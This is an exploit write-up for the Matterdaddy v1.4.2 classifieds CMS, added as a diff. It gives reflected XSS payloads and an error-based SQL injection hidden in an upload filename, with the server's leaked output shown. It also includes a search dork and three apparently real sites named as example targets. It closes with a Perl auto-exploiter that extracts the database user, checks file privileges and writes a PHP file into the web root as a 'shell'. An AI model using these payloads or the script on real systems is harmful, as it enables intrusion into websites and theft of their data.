@@ -1,0 +1,86 @@
+id: 19635
+date: 10/27/2012
+title: Matterdaddy v1.4.2 Multiple Vulnerabilities
+author: r4x0r4x
+cves: 
+
+Matterdaddy v1.4.2 Multiple Vulnerabilities
+
+so da vulnZ for this little shitty cms starts from innumerevol X$$s (non persistant)........... starting from th1$:
+
+http://localhost/market/index.php?q=<script>alert(1);</script>
+
+another one....
+
+http://localhost/market/index.php?category=4</script><script>alert(1);</script>
+
+an finally the SQLi....
+
+da vulnZZZ variable are in the image name in the form upload, this is a pretty cute POST dump from the 1inj3c7:
+
+Content-Disposition: form-data; name="filetoupload"; filename="shellpowa' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,user(),0x3a,version(),0x3a,database(),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -.php.jpg"\r\n
+Content-Type: image/jpeg\r\n
+\r\n
+
+da RESPONSE:
+
+Notice: Undefined variable: REMOTE_ADDR in /var/www/htdocs/market/controller.php on line 9 Notice: Undefined index: email in /var/www/htdocs/market/controller.php on line 15 Notice: Undefined index: uploadform in /var/www/htdocs/market/controller.php on line 51 Notice: Undefined variable: ext in /var/www/htdocs/market/inc_functions.php on line 60 .jpg Warning: imagecreatefromstring(): Data is not in a recognized format in /var/www/htdocs/market/inc_thumbnail.php on line 174 Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/htdocs/market/inc_thumbnail.php on line 175 Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/htdocs/market/inc_thumbnail.php on line 176 Warning: imagecopyresampled() expects parameter 2 to be resource, boolean given in /var/www/htdocs/market/inc_thumbnail.php on line 265 Warning: imagejpeg(): Unable to open 'photos/20120802223533_shellpowa' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,user(),0x3a,version(),0x3a,database(),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -.php.jpg' for writing: File name too long in /var/www/htdocs/market/inc_thumbnail.php on line 196 Warning: imagecreatefromstring(): Data is not in a recognized format in /var/www/htdocs/market/inc_thumbnail.php on line 174 Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/htdocs/market/inc_thumbnail.php on line 175 Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/htdocs/market/inc_thumbnail.php on line 176 Warning: imagecopyresampled() expects parameter 2 to be resource, boolean given in /var/www/htdocs/market/inc_thumbnail.php on line 265 Warning: imagejpeg(): Unable to open 'photos/thumb_20120802223533_shellpowa' and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,user(),0x3a,version(),0x3a,database(),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -.php.jpg' for writing: File name too long in /var/www/htdocs/market/inc_thumbnail.php on line 196 There was a problem while trying to create a new item:
+#######@@@@@@@@@@@@->>>>>>>>>>>>>>>>>>>>>>>>>Duplicate entry '~'root@localhost:5.1.56:market'~1' for key 'group_key'
+
+http://localhost/market/action.php?cp=1' and(select+1+from(select+count(*),concat((select concat('>>',version(),'<<')),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a) -- -
+
+Duplicate entry '>>5.1.56<<1' for key 'group_key'
+
+dork:
+intext:"Powered by Matterdaddy"
+examples sites:
+http://diningandspirits.com/classifieds/index.php?a=1
+http://www.avnv.us/classifieds
+http://www.rrvfsc.org/market_v1_1/index.php?a=1
+
+###########EXPLOIT##############
+
+#!/usr/bin/perl
+use LWP::Simple;
+sub usage(){
+	print "Market 1.4.2 CMS Auto exploiter.\n";
+	print "Usage: ".$0." <URL> <FPD>\n";
+	exit;
+}
+if ($#ARGV != 1){
+	usage();
+}
+$url_to_user=$ARGV[0];
+$fpd=$ARGV[1];
+$url_to_user=$url_to_user."action.php?cp=1' and(select+1+from(select+count(*),concat((select concat(0x3a3a3a3a3a,user(),0x3a3a3a3a3a)),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a) -- -";
+$sc_user=get $url_to_user;
+if ($sc_user=~/:::::(.+?)@(.*?):::::/){
+	$user=$1;
+}else{
+	print "Cannot retrive the user, closing...\n";
+	exit;
+}
+@hexuser=unpack('C*', $user);
+$hexuserok = '';
+foreach $c (@hexuser) {
+  $hexuserok .= sprintf ("%lx", $c);
+}
+$ck_file_priv=$ARGV[0]."action.php?cp=1' and(select+1+from(select+count(*),concat((select concat(0x3a3a3a3a3a,file_priv,0x3a3a3a3a3a) from mysql.user where user=0x".$hexuserok." limit 0,1),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a) -- -";
+$sc_file_priv= get $ck_file_priv;
+if ($sc_file_priv=~/:::::(.+?):::::/){
+	$fp=$1;
+}else{
+	print "Cannot retrive the privleges, closing...\n";
+	exit;
+}
+if ($fp=="Y"){
+	print "w00t we g0t fil1_pr1V here... starting upload the shell...\n";
+}else{
+	print "no file_priv found ding now...\n";
+	die();
+}
+$query_to_fuckup=$ARGV[0]."action.php?cp=1'UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,'<?php phpinfo();?>' into outfile '".$fpd."shell.php'  -- -";
+$check_final= get $query_to_fuckup;
+print "G0t 1t.... enyied with ur sh3ll spawned at ".$fpd."shell.php\n";
+
+#  0day.today [2023-03-26]  #
